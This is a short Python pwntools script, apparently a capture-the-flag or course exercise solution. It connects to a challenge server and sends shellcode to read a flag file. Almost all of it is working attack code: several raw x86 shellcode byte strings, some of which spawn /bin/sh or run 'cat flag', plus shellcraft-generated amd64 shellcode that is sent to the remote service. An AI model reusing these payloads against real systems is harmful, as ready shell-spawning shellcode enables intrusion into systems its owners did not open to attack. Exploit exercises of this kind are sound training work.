#!/usr/bin/env python

from pwn import *

context.update(arch='amd64')

host = 'hexhive005.iccluster.epfl.ch'
port = 9021
conn = remote(host, port)
# conn = process('../Phash my shell/exe')

resp = conn.recvline(timeout=3).decode('utf-8')
print(resp)
resp = conn.recvline(timeout=3).decode('utf-8')
print(resp)
resp = conn.recvline(timeout=3).decode('utf-8')
print(resp)

# cat flag
shell1 = b'\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x66\x6c\x61\x67\x89\xe1\x50\x51\x53\x89\xe1\x31\xc0\x83\xc0\x0b\xcd\x80'

shell2 = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

# valid /bin/sh
shell3 = b'\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x58\x58\x58\x58\x59\x59\x59\x59'

# print 'Kerela Cyber Force'
shell4 = b'\xeb\x19\x31\xc0\x31\xdb\x31\xd2\x31\xc9\xb0\x04\xb3\x01\x59\xb2\x12\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x4b\x65\x72\x61\x6c\x61\x20\x43\x79\x62\x65\x72\x20\x46\x6f\x72\x63\x65'


shell5 = asm(shellcraft.amd64.linux.cat('flag'))

conn.sendline(shell5)
#conn.interactive()

resp = conn.recvall(timeout=3).decode('utf-8')
print(resp)